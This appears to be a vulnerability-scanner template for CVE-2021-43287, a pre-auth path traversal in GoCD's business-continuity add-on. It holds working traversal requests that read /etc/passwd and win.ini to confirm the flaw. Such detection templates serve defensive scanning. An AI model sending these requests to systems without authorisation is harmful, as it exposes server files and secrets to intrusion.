id: CVE-2021-43287

info:
  name: Pre-Auth Takeover of Build Pipelines in GoCD
  author: For3stCo1d
  severity: critical
  description: |-
    An issue was discovered in ThoughtWorks GoCD before 21.3.0. The business continuity add-on, which is enabled by default, leaks all secrets known to the GoCD server to unauthenticated attackers.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-43287
  tags: cve,cve2021,gocd,takeover
  created: 2023/07/15

rules:
  linux0:
    request:
      method: GET
      path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  windows0:
    request:
      method: GET
      path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini
    expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
expression: windows0() || linux0()
